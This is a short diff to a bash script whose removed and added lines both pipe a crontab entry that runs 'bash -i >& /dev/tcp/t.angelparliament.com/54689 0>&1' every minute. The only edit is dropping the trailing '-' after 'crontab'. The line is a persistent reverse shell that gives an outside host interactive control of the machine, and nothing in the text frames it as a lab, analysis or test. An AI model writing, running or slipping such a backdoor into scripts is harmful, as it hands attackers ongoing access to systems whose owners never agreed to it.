@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "* * * * * bash -i >& /dev/tcp/t.angelparliament.com/54689 0>&1" | crontab -
+echo "* * * * * bash -i >& /dev/tcp/t.angelparliament.com/54689 0>&1" | crontab
